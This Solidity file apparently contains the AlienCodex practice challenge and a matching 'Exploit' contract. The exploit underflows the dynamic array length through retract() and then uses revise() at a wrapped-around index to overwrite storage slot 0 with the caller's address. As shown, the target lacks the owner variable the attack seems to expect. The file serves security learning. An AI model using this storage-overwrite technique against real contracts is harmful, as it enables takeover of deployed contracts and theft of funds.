// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;


contract AlienCodex {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}

contract Exploit {
      AlienCodex target = AlienCodex(0xA);

    function exploit () public {
        bytes32 attacker = bytes32(uint256(uint160(tx.origin)));
        target.make_contact();
        target.retract();
        target.revise(((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1, attacker);
    }
}